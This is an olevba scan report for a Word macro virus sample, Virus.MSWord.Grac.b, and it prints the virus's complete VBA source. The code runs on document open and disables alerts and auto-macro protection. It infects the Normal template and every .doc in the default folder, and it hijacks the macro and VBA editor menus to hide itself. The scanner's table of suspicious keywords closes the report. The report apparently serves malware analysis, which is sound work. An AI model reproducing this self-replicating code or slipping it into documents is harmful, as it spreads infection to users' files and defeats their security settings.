olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Grac.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Grac.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO fotografia.frm 
in file: Virus.MSWord.Grac.b - OLE stream: 'Macros/VBA/fotografia'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 









Private Sub UserForm_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    mover
End Sub

Private Sub UserForm_Terminate()
    fotografia.Caption = "Soy toda tuya!"
    fotografia.Show
End Sub

Sub mover()
    fotografia.Top = Rnd * 100 + Rnd * 100 + Rnd * 100 + Rnd * 100 + Rnd * 100
    fotografia.Left = Rnd * 100 + Rnd * 100 + Rnd * 100 + Rnd * 100 + Rnd * 100 + _
                    Rnd * 100 + Rnd * 100 + Rnd * 50
End Sub


-------------------------------------------------------------------------------
VBA MACRO graciela.bas 
in file: Virus.MSWord.Grac.b - OLE stream: 'Macros/VBA/graciela'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim cheleado As Boolean, architmp As String

Sub AutoOpen()
    On Error Resume Next
    desactivar_todo
    no_me_veras_ok
    copiar_me
    cerrar_plantilla
    mostrar_graciela
End Sub

Sub desactivar_todo()
    On Error Resume Next
    Application.EnableCancelKey = 0
    Application.DisplayAlerts = 0
    WordBasic.DisableAutoMacros False
End Sub

Sub copiar_me()
    On Error Resume Next
    Dim ya As Boolean, dirtmp As String
    dirtmp = Options.DefaultFilePath(0)
    architmp = ActiveDocument.FullName
    With Application.FileSearch
        .NewSearch
        .LookIn = Options.DefaultFilePath(8)
        .FileName = "graciela.src"
        .MatchTextExactly = False
        If .Execute > 0 Then
            For i = 1 To .FoundFiles.Count
                    ya = True
            Next i
        End If
    End With
    If ya = False Then
        With ActiveDocument
            .SaveAs FileName:=Options.DefaultFilePath(8) & "\graciela.src", _
                            FileFormat:=wdFormatTemplate, _
                            AddToRecentFiles:=False
        End With
        copiar_items (NormalTemplate.FullName)
        NormalTemplate.Save
        reproducir_me (dirtmp)
    End If
End Sub

Sub reproducir_me(direc As String)
    On Error Resume Next
    With Application.FileSearch
        .NewSearch
        .LookIn = direc
        .SearchSubFolders = False
        .FileName = "*.doc"
        .MatchTextExactly = False
        .FileType = 3
        If .Execute > 0 Then
            For i = 1 To .FoundFiles.Count
                If ActiveDocument.FullName <> .FoundFiles(i) Then
                    copiar_items (.FoundFiles(i))
                End If
            Next i
        End If
    End With
End Sub

Sub copiar_items(archivo As String)
    On Error Resume Next
    Dim nmak(1) As String, NT As Object
    Dim aSrc$
    Dim aDes As Variant
    aDes = archivo
    nmak(0) = "fotografia"
    nmak(1) = "graciela"
    aSrc = Options.DefaultFilePath(8) & "\graciela.src"
    checar aDes
    If chelado = False Then fotocopiar aSrc, aDes, nmak
    ActiveDocument.Save
End Sub

Public Sub fotocopiar(Sfile, Dfile, nmak)
    On Error Resume Next
    Dim aNmak
    For Each aNmak In nmak
        On Error Resume Next
        Application.OrganizerCopy Sfile, Dfile, aNmak, 3
    Next
End Sub

Sub cerrar_plantilla()
    On Error Resume Next
    If ActiveDocument.Name = "graciela.src" Then
        Documents.Open architmp, False, False, False, "", "", False, "", "", 0
        Windows("graciela.src").Close
    End If
End Sub

Sub checar(Sfile)
    Dim nmak As Object, foto As Boolean, chela As Boolean
    cheleado = False
    For Each nmak In Sfile.VBProject.VBComponents
        If nmak.Name = "fotografia" Then foto = True
        If nmak.Name = "graciela" Then chela = True
    Next nmak
    If (foto And chela) Then cheleado = True
End Sub

Sub no_me_veras_ok()
    On Error Resume Next
    CommandBars("Macro").Controls(1).OnAction = "ViewVbCode"
    CommandBars("Macro").Controls(2).OnAction = "ViewVbCode"
    CommandBars("Visual Basic").Controls(1).OnAction = "ViewVbCode"
    CommandBars("Visual Basic").Controls(2).OnAction = "ViewVbCode"
End Sub

Sub ToolsMacro()
    ViewVBcode
End Sub

Sub ViewVBcode()
    On Error Resume Next
    If MsgBox("Me quieres ver desnuda?", vbExclamation + vbYesNo, "Chela") = vbYes Then
        SendKeys "%m%s%b~%dAtrevido...%m"
    Else
        SendKeys "tu te lo pierdes..."
    End If
End Sub

Sub mostrar_graciela()
    On Error Resume Next
    Dim hoy As Integer
    hoy = Day(Now())
    If (hoy = 5) Or _
       (hoy = 12) Or _
       (hoy = 19) Or _
       (hoy = 26) Then
            fotografia.Show
    End If
End Sub

Sub FileOpen()
    On Error Resume Next
    mostrar_graciela
    Dialogs(80).Show
    copiar_items (ActiveDocument.FullName)
End Sub

Sub FileSaveAS()
    On Error Resume Next
    Dialogs(84).Show
    FileSave
End Sub

Sub FileSave()
    On Error Resume Next
    ActiveDocument.Save
    copiar_items (ActiveDocument.FullName)
    mostrar_graciela
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |UserForm_MouseMove  |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|$]>M                |245D3E4D                                     |
+----------+--------------------+---------------------------------------------+

